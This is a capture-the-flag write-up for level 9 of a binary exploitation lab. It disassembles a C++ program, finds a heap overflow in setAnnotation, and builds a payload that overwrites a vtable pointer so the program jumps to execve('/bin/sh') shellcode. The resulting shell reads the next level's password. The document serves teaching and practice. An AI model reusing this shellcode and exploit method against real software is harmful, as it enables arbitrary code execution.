# Level 9

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
```


## Testing the program

```bash
$ ./level9 
$ ./level9 hello
$ ./level9 bye bye
$ ./level9 214
```

## Learning more 


```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   0x08048670 <+124>:	mov    0x14(%esp),%eax
   0x08048674 <+128>:	mov    %eax,(%esp)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
```


Okay there are a few new things that are intriguing, that we managed to understood after a few research : 
```plaintext
   • _Znwj --> Mangled name for the 'new' operator in C++. 
   • _ZN1NC2Ei is also a mangled name, which gives : 
      • _Z → start of the mangle.  
      • N1N → class N
      • C2 → constructor
      • i → takes an int as an argument
   • _ZN1N13setAnnotationEPc --> Call to a member function of the class
      • Class N
      • Method setAnnotation
      • Parameter char* (Pc)
```

```plaintext
💡 Name mangling is used in C++ to make each function name unique by encoding information like parameter types and class scopes, allowing the linker to correctly identify overloaded functions. It's essential because C++ supports features like function overloading. 
```

If we use the c++filte we can unmangled the c++ functions

```bash 
c++filt _Znwj                            
operator new(unsigned int)
```

This is the part that is interesting for us :

```bash
mov eax, [esp+0x10]   ; EAX = ptr_B
mov eax, [eax]        ; EAX = *(ptr_B) → vtable pointer
mov edx, [eax]        ; EDX = *(vtable) → virtual method ptr
call edx              ; Appel indirect
```

What is stored at [esp + 0x10] is taken and put into EAX, therefore EAX holds B address (a pointer to an object).

On the second step we read what is in EAX and put it into EAX. EAX holds B address, a pointer to the start of an object with virtual methods, therefore it points to a vtable. 
So EAX = vtable of B

On the third step we read the content of EAX (now the vtable) and store it into EDX. So EDX now has the virtual method to be called. 

So schematise here is what will happen : 

```plaintext
[esp+0x10]              || 0x804a060 (adresse de B, pointer to an object)
*ptrB = ptrB (adresse)  || 0x804a060    → 0x804a100 (pointeur vtable)         
*ptrB= vtable           || 0x804a100    → 0xdeadbeef (adresse fonction virtuelle)              
``` 

So our goal is going to make the vtable address point towards a shellcode. 

## Getting acces to the pass

Our goal : 
1. Overflow of the memcpy used in setAnnotation 
2. Overwrite the vtable of the B object --> make it point to a shellcode  



```bash 
(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
Starting program: /home/user/level9/level9 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register eax
eax            0x41366441	1094083649
```

So our offet is : 
0x41366441 --> 108

```bash 
(gdb) b *main+136                                    // Just after the setAnnotation() call
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x41414141                           // address of the a object where annotation start
```
So we will inject our shellcode at this address. 

## Making the payload

[esp+0x10] → pointer to 0x804a00c --> \x10\xa0\x04\x08
0x804a00c → pointer to 0x804a010 (0x804a00c + 4) (shellcode) --> \x0c\xa0\x04\x08
0x804a010 → our shellcode

```plaintext
payload : shell_addr + shellcode + padding + buffer_addr
          [4 bytes]   [28 bytes]  [76 bytes]  [4 bytes] = 108 + 4

```

So we have
```bash
$ python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
```

```bash
level9@RainFall:~$ ./level9 $( python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```